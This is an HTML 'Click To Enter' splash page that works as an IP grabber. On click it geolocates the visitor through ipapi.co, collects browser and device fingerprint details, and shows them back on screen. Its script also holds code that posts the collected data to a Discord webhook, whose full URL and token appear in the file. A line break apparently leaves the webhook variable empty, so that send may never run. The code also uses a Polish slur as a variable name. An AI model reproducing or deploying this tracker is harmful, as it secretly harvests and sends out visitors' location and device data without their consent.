<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Click To Enter</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    :root { --hacker-green: #00b33c; }
    html, body { height:100%; margin:0; padding:0; }
    body {
      background:#000;
      color:var(--hacker-green);
      font-family:'Inter', Arial, Helvetica, sans-serif;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:flex-start;
      text-align:center;
      overflow-y:auto;
      padding-bottom:50px;
    }
    #title {
      font-size:140px;
      margin:120px 0 20px;
      color:var(--hacker-green);
      text-shadow:0 0 10px rgba(0,179,60,0.2);
      animation:pulse 2s infinite;
      user-select:none;
    }
    #enterBtn {
      padding:24px 50px;
      font-size:32px;
      border-radius:14px;
      border:2px solid var(--hacker-green);
      background:transparent;
      color:var(--hacker-green);
      cursor:pointer;
      transition: transform 0.1s, box-shadow 0.2s;
      margin-bottom:40px;
    }
    #enterBtn:hover {
      transform:scale(1.07);
      box-shadow:0 0 20px rgba(0,179,60,0.25);
    }
    #info {
      margin-top:40px;
      width:100%;
      max-width:1400px;
      display:none;
      padding:0 20px;
      box-sizing:border-box;
    }
    .line {
      font-size:24px;
      line-height:1.1;
      margin:10px 0;
      opacity:0;
      transform:translateY(-240px);
      transition: transform 1s cubic-bezier(.22,.9,.3,1), opacity 0.1s ease-in;
      white-space:nowrap;
      overflow:hidden;
      text-overflow:ellipsis;
      color:var(--hacker-green);
      text-shadow:0 0 8px rgba(0,179,60,0.15);
    }
    .line.show {
      opacity:1;
      transform:translateY(0);
    }
    @keyframes pulse {
      0%,100% { transform:scale(1.1); }
      50% { transform:scale(1); }
    }
    @media (max-width:900px){
      #title { font-size:72px; margin-top:80px; }
      #enterBtn { font-size:24px; padding:16px 32px; }
      .line { font-size:42px; }
    }
  </style>
</head>
<body>
  <div id="topWrap" style="width:100%; display:flex; flex-direction:column; align-items:center;">
    <div id="title">Click To Enter</div>
    <button id="enterBtn">ENTER</button>
  </div>
  <div id="info"></div>

  <!-- Muzyka -->
  <audio id="bgMusic" loop>
    <source src="ppp.mp3" type="audio/mpeg">
    Twoja przeglądarka nie obsługuje audio.
  </audio>

  <script>
    const CWEL_CWEL = ""
    "https://discord.com/api/webhooks/1456348903145472113/JM_GQ8X5ajggIm33Le_8hNdD5jNXJBLwxdUbfHWm--ucBhd0KaqKaNVMwgw2gCsfEtrt"


    const enterBtn = document.getElementById('enterBtn');
    const title = document.getElementById('title');
    const infoDiv = document.getElementById('info');
    const music = document.getElementById('bgMusic');

    const wait = ms => new Promise(res => setTimeout(res, ms));

    const smoothScrollTo = (targetY, duration = 900) => {
      const startY = window.scrollY || window.pageYOffset;
      const distance = targetY - startY;
      const startTime = performance.now();
      return new Promise(resolve => {
        const step = now => {
          const elapsed = now - startTime;
          const t = Math.min(1, elapsed / duration);
          const ease = t < 0.5 ? 2*t*t : -1 + (4 - 2*t)*t;
          window.scrollTo(0, Math.round(startY + distance * ease));
          t < 1 ? requestAnimationFrame(step) : resolve();
        };
        requestAnimationFrame(step);
      });
    };

    enterBtn.addEventListener('click', async () => {
      title.style.display='none';
      enterBtn.style.display='none';
      infoDiv.style.display='block';

      // Odpalenie muzyki
      music.volume = 1.0;
      music.play().catch(e=>console.warn("Audio error:", e));

      const browser = navigator.userAgent;
      const platform = navigator.platform;
      const lang = navigator.language;

      let data = {};
      try {
        const resp = await fetch('https://ipapi.co/json/');
        data = await resp.json();
      } catch(e){ console.error("IP fetch error:", e); }

      const infoLines = [
        `IP: ${data.ip||'None'}`,
        `COUNTRY: ${data.country_name||'None'}`,
        `CITY: ${data.city||'None'}`,
        `REGION: ${data.region||'None'}`,
        `SUPPLIER: ${data.org||'None'}`,
        `ZIP CODE: ${data.postal||'Nonek'}`,
        `TIME ZONE: ${data.timezone||'None'}`,
        `BROWSER: ${browser}`,
        `SYSTEM: ${platform}`,
        `BROWSER LANGUAGE: ${lang}`,
        `USER AGENT: ${navigator.userAgent}`,
        `COOKIES: ${navigator.cookieEnabled}`,
        `JS: ${typeof navigator.javaEnabled==='function'?navigator.javaEnabled():'None'}`,
        `RESOLUTION: ${window.screen.width}x${window.screen.height}`,
        `COLORS: ${window.screen.colorDepth}bit`,
        `PIXEL RATIO: ${window.devicePixelRatio}`,
        `CPU: ${navigator.hardwareConcurrency||'None'}`,
        `ONLINE: ${navigator.onLine}`,
        `REFRERR: ${document.referrer||'None'}`,
        `URL: ${location.href}`,
        `HOSTNAME: ${window.location.hostname}`,
        `ORGIN: ${window.location.origin}`,
        `DO NOT TRACK: ${navigator.doNotTrack||'None'}`,
        `TYPE: ${navigator.connection?navigator.connection.effectiveType:'None'}`
      ];

      if(CWEL_CWEL.trim().length>10){
        const payload = { content: `Svc Comet - new visitor\n${infoLines.join('\n')}` };
        fetch(CWEL_CWEL, {
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(payload)
        }).catch(e=>console.error("send error:", e));
      }

      // Wyświetl linia po linii
      for(let i=0;i<infoLines.length;i++){
        const p=document.createElement('p');
        p.className='line';
        p.textContent = infoLines[i];
        infoDiv.appendChild(p);
        await wait(i===0?80:700);
        p.classList.add('show');
        smoothScrollTo(document.body.scrollHeight,800);



        
      }
    });
  </script>
</body>
</html>
